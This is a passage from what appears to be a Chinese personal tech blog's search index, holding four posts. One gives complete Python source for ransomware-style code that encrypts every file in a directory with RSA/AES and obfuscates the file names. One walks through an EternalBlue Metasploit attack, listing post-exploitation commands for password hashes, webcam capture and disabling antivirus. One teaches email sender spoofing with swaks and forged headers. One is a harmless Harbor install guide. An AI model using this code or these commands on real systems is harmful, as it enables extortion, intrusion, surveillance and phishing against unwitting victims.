XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。\n\n### 秘钥生成\n\n准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！\n\n如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。\n\n```python\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # 生成 2048 位的 RSA 密钥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 生成私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 生成公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\n当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。\n\n公钥：\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\n私钥：\n\n```bash\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\n当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。\n\n### 文件加密\n\n现在我们来看看如何对文件进行加密处理：\n\n```python\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # 二进制只读打开文件，读取文件数据\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # 一个 16 字节的会话密钥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\n我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。\n\n加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。\n\n### 私钥解密\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\n我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。\n\n接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。\n\n解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！\n\n### 变更文件名\n\n当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：\n\n举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```python\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\n使用了base64对文件名进行编码。\n\n### 恢复文件名\n\n举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```python\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\n使用了base64对文件进行解码。\n\n### 完整源码\n\n我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：\n\n```python\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# 解密代码\n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # 遍历文件，加密并且改名\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # 遍历文件，解密并且恢复名字\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# 加密代码\ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # 切换加密和解密过程\n        # if False:   # 解密文件\n        if True:  # 加密文件\n            # 遍历文件，加密并且改名\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # 遍历文件，解密并且恢复名字\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\n唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。\n\n以下是几个实现的效果图：\n\n![加密之前](./Python-encrypted-file/1.png)\n\n![加密之后](./Python-encrypted-file/2.png)\n\n![解密之后](./Python-encrypted-file/3.png)\n\n### 写在后面的话\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！","tags":["python"],"categories":["技术"]},{"title":"永恒之蓝复现以及简单的后渗透信息收集","url":"/2023/04/16/crypto/","content":"\n\n### 环境准备\n\n首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。\n\n<!-- more -->\n\n### 网络准备\n\n必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。\n\n### 攻击开始\n\n1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。\n\n```c\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![扫描域内主机](./crypto/1.png)\n\n可以看到有一个***192.168.20.129***的主机可用，开启了445端口。我们就对这个主机进行攻击。\n\n2. windows验证一下，发现windows获取的IP确实是***192.168.20.129***\n\n![windows验证](./crypto//2.png)\n\n3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。\n\n```c\n    # msfconsole -q  \n```\n\n> -q 选项不再继续打印工具启动时的图形文字\n\n> 运行之后是这样的效果\n\n![msfconsole](./crypto/3.png)\n\n4. 执行以下命令，搜索可以利用的漏洞工具\n\n```c\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. 选择序号为0的漏洞进行攻击，分别执行以下代码\n\n```c\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。\n\n效果图如下：\n\n![开始攻击](./crypto/5.png)\n\n6. 稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter>**，入侵完成，我们可以用命令进行对windows主机的任何操作。\n\n|命令|功能|\n|:---:|:---:|\n|shell|启动靶机主机的cmd|\n|screenshot|对靶机进行屏幕截图|\n|webcam_list|列出摄像头|\n|webcam_snap|利用靶机摄像头拍照|\n|webcam_stream|利用靶机摄像头拍视频|\n|getuid|获取登录用户|\n|getsystem|获取磁盘信息|\n|hashdump|获取密码的哈希值|\n|kill|杀掉进程|\n|download|下载文件|\n|upload|上传文件|\n|run killav|关闭杀软|\n|run post/windows/manage/killava|关闭杀软|\n|run post/windows/gather/checkkvm|检查是否是虚拟机|\n|run post/windows/gather/enum_services|列出所有的服务|\n|run post/windows/gather/enum_applications|列出运行的程序|\n|run post/windows/gather/enum_patches|列出打的补丁|\n|run post/windows/gather/dumplinks|列出最近的操作|\n\n\n7. 以下是利用上述命令实现的一些效果图\n\n* 使用shell\n\n```c\n    meterpreter > shell\n```\n> 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。\n\n![帅哥](./crypto/6.png)\n\n* 屏幕截图，运行以下命令\n\n```c\n    meterpreter > screenshot\n```\n\n运行成功后桌面上会多了一张windows的屏幕截图\n\n![帅哥](./crypto/7.png)\n\n* 上传文件\n\n上传这一张照片\n\n![帅哥](./crypto/8.png)\n\n执行以下命令\n\n```c\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![帅哥](./crypto/9.png)\n\n显示上传成功，然后去windows主机验证。\n\n![帅哥](./crypto/10.png)\n\n上传成功，windows正常查看。\n\n* 调用网络摄像头，运行以下命令\n\n```c\n    meterpreter > webcam_stream\n```\n\n![帅哥](./crypto/11.png)\n\n> kali 成功调用到了windows7的摄像头\n\n### 写在后面的话\n\n网络并不是法外之地，且行且珍惜。","tags":["网络安全"],"categories":["技术"]},{"title":"Linux安装harbor","url":"/2023/04/07/linux-install-harbor/","content":"### 安装准备\n\n1. 首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。\n\n```bash\nwget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz\n```\n\n### 解压包\n\n2. 下载完成后，执行以下命令进行解压。\n\n<!-- more -->\n\n```bash\ntar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz \n```\n\n### 修改配置文件\n\n3. 解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。\n\n```bash\ncp harbor.yml.tmpl harbor.yml\n```\n\n按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。\n\n![](https://lxp731.github.io/img/docker/1.png)\n\n![](https://lxp731.github.io/img/docker/2.png)\n\n### 执行可执行文件\n\n4. 修改完成配置文件后，执行以下命令，之后会根据.yml文件***生成很多容器***。\n\n```bash\n./install.sh \n```\n\n等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。\n\n### 报错解决\n\n5. 在主机上进行登录的时候忘记输入端口号\n\n```bash\ndocker login 192.168.20.10:8080\n```\n\n6. 生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。\n\n```bash\nsystemctl daemon-reload\n```\n\n```bash\nsystemctl restart docker\n```\n\n7. 最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。\n\n![](https://lxp731.github.io/img/docker/3.png)\n\n执行以下命令查看运行的/运行过的容器。\n\n```bash\ndocker ps -a\n```\n\n执行以下命令重启容器\n\n```bash\ndocker restart '容器ID'\n```\n\n最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。","tags":["Docker"],"categories":["学习过程"]},{"title":"邮件伪造 自己给自己发了一封邮件？？？","url":"/2023/04/04/post-fake-mail/","content":"网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。\n\n如果有kali直接利用kali就OK，有一个工具叫swaks.\n\n```bash\nswaks --to river_li@whu.edu.cn\n```\n\n这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。\n\n<!-- more -->\n\nswaks 有常用的几个选项   \n\n* --to\n* --from\n* --h-To\n* --h-From\n\n直接在命令行中指定的--from实际上是SMTP协议中的MailFrom字段，即信封上的From\n\n使用--h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From\n\n--to和--h-To同理\n\n* --server —要登录的服务器\n* --ehlo   —要验证hello的服务器\n* -au    —在这个服务器上的用户名\n* -ap    —对应的用户密码\n\nswaks还可以登录登录其他的邮箱来发送邮件\n\n```bash\nswaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn\n```\n\n```bash\nswaks --to m19527705687@163.com --from m19527705687@163.com --body 'This is a test mailing' --header 'Subject: test' --ehlo gmail.com --header-X-Mailer gmail.com\n```\n\n这个命令的to和from都是一样的参数，很明显是执行不成功的。\n\n```bash\n=== Trying 163mx01.mxmail.netease.com:25...\n=== Connected to 163mx01.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO gmail.com\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<m19527700560@163.com>\n<** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n发生了553的错误。\n\n单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。\n\n---\n\n更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。\n\n```bash\nswaks --to river_li@whu.edu.cn --data data.eml\n```\n\n指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。\n可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的--to选项和--from选项即使相同也并不发生冲突，命令里的--to选项正常写。\n\n```bash\nDelivered-To: yixianosaurusphangnga7096@gmail.com\nReceived: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nX-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\nX-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n        d=google.com; s=arc-20160816;\n        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n         GyjA==\nARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n        h=subject:from:to:date:message-id;\n        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n         Kuvw==\nARC-Authentication-Results: i=1; mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nReturn-Path: <admin@saucer-man.com>\nReceived: from saucer-man.com ([003.11.50.2])\n        by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n        for <yixianosaurusphaaaga7096@gmail.com>;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nReceived-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\nAuthentication-Results: mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nMessage-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\nDate: Mon, 30 Mar 2020 15:32:58 +0800\nTo: yixianosaurusphaaaga7096@gmail.com\nFrom: admin@saucer-man.com\nSubject: test mail\nX-Mailer: saucer-man.com\n\n这里是信件的正文内容，可以进行修改。\n```    \n\n## PS：\n\n***Date: Mon, 30 Mar 2020 15:32:58 +0800***\n\n***To: yixianosaurusphaaaga7096@gmail.com***\n\n***From: admin@saucer-man.com***\n\n***Subject: test mail***\n\n> Date —可以修改邮件的时间戳\n\n> To —可以修改邮件的收件人\n\n> From —修改邮件的发件人\n\n> Subject —修改邮件的主题\n\n一般修改这几项就OK了\n\n---\n\n### 成功的案例\n\n```bash\nswaks --to worktestnet321@163.com --data /data.eml \n```\n\n我把文件写在了根目录下data.eml文件中，命令里的--to 是我要发送的邮件地址。\n\n```bash\n*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed in the future.  Prefix filenames with '@' instead.\n=== Trying 163mx03.mxmail.netease.com:25...\n=== Connected to 163mx03.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO knight\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<knight@knight>\n<-  250 Mail OK\n -> RCPT TO:<m19527700560@163.com>\n<-  250 Mail OK\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Delivered-To: yixianosaurusphangnga7096@gmail.com\n -> Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\n -> X-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n ->         d=google.com; s=arc-20160816;\n ->         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n ->          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n ->          b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n ->          GyjA==\n -> ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n ->         h=subject:from:to:date:message-id;\n ->         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n ->         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n ->          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n ->          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n ->          Kuvw==\n -> ARC-Authentication-Results: i=1; mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Return-Path: <admin@saucer-man.com>\n -> Received: from saucer-man.com ([003.11.50.2])\n ->         by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n ->         for <yixianosaurusphaaaga7096@gmail.com>;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> Received-SPF: temperror (google.com: error in processing during lookup of 